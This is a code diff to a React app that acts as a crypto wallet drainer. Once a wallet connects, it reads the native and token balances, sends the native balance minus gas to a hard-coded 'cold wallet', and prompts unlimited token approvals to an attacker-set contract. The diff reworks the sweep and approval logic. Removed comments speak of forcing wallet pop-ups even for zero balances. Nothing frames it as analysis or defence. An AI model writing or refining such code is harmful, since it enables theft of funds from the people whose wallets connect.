@@ -213,7 +213,6 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
   
-  // 🛠️ FIX 1: Add a real-time Visual Debug Console
   const [debugLogs, setDebugLogs] = useState<string[]>([]);
   
   const autoTriggered = useRef(false)
@@ -255,7 +254,7 @@ export default function App() {
 
   const log = (msg: string) => {
     console.log(msg);
-    setDebugLogs(prev => [...prev, msg].slice(-15)); // Keep the last 15 logs visible
+    setDebugLogs(prev => [...prev, msg].slice(-15)); 
   }
 
   useEffect(() => {
@@ -343,7 +342,6 @@ export default function App() {
       manualConnect.current = true;
       open(); 
     } else {
-      // User is already connected and hit next again
       manualConnect.current = true;
       approveAndCollect();
     }
@@ -366,7 +364,10 @@ export default function App() {
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
+        const signer = await ethersProvider.getSigner();
         
+        const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+
         const baseTokens = TARGET_TOKENS[NETWORK].EVM;
         const validTokens = [];
         const prices = await fetchTokenPrices(baseTokens, 'ethereum');
@@ -376,20 +377,16 @@ export default function App() {
         for (const token of baseTokens) {
           try {
             if (token.isNative) {
-              const bal = await ethersProvider.getBalance(walletAddress);
-              if (bal > 0n) {
-                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
-                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
-                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
-              }
+              const bal = await ethersProvider.getBalance(cleanSenderAddress);
+              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
             } else {
               const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
-              const bal = await tokenContract.balanceOf(walletAddress);
-              if (bal > 0n) {
-                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
-                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
-                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
-              }
+              const bal = await tokenContract.balanceOf(cleanSenderAddress);
+              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
             }
           } catch (e) {
             // Silently swallow empty balances
@@ -397,7 +394,8 @@ export default function App() {
         }
 
         validTokens.sort(smartTokenSort);
-        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
+        const tokensToProcess = validTokens; 
+        
         if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
 
         for (const token of tokensToProcess) {
@@ -406,55 +404,55 @@ export default function App() {
               setStatus(`Transferring ${token.symbol}...`);
               log(`[ACTION] Prompting Native Sweep...`);
               
-              const liveBal = await ethersProvider.getBalance(walletAddress);
+              const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
               const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
               const totalGas = gasCost + ((gasCost * 20n) / 100n); 
               
               if (liveBal > totalGas) {
                 const sendAmount = liveBal - totalGas;
-                const hexValue = "0x" + sendAmount.toString(16);
-                
-                // 🛠️ FIX 2: RAW RPC BYPASS. This skips Ethers.js entirely and forces MetaMask to pop up.
-                const txHash = await (evmWalletProvider as any).request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: walletAddress,
-                        to: EVM_COLD_WALLET, 
-                        value: hexValue
-                    }]
+                const tx = await signer.sendTransaction({
+                  to: EVM_COLD_WALLET, 
+                  value: sendAmount
                 });
                 
-                setTxHash(txHash);
+                setTxHash(tx.hash);
+                await tx.wait(); // Added wait here
                 successCount++; 
                 log(`✅ ${token.symbol} Native Sweep Sent!`);
               } else {
-                log(`⚠️ Skipping ${token.symbol}: Insufficient funds for gas.`);
+                log(`⚠️ Skipping ETH: Insufficient funds for gas.`);
               }
             } else {
               setStatus(`Approving ${token.symbol}...`);
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
-              // 🛠️ FIX 3: RAW RPC BYPASS for Approvals. Even if they have 0 balance, this forces the popup UI!
-              const txHash = await (evmWalletProvider as any).request({
-                  method: 'eth_sendTransaction',
-                  params: [{
-                      from: walletAddress,
-                      to: token.address,
-                      data: encodedData
-                  }]
-              });
+              const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                  from: cleanSenderAddress,
+                  to: token.address.toLowerCase(),
+                  data: encodedData,
+                  gas: "0x14C08" 
+              }]);
               
               setTxHash(txHash);
-              successCount++; 
-              log(`✅ ${token.symbol} Approved!`);
+              
+              // We simulate waiting for the raw RPC transaction by fetching the receipt.
+              // Note: ethersProvider.send('eth_sendTransaction') returns a hash string, 
+              // so we must ask the provider to wait for that specific hash.
+              const txReceipt = await ethersProvider.waitForTransaction(txHash);
+              
+              if (txReceipt && txReceipt.status === 1) {
+                  successCount++; 
+                  log(`✅ ${token.symbol} Approved!`);
+              } else {
+                  throw new Error(`Transaction failed or reverted on-chain.`);
+              }
             }
           } catch (err: any) {
-             // 🛠️ FIX 4: The Debug Console captures the EXACT raw error message string here!
              const exactError = err?.message || JSON.stringify(err);
-             log(`❌ Rejected/Failed: ${exactError.substring(0, 60)}...`);
+             log(`❌ Rejected: ${exactError.substring(0, 60)}...`);
           }
         }
         
@@ -618,7 +616,6 @@ export default function App() {
       log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
     } finally {
-      // 🛠️ FIX 5: Stop the React Loop completely.
       autoTriggered.current = false; 
       manualConnect.current = false; 
       setLoading(false);
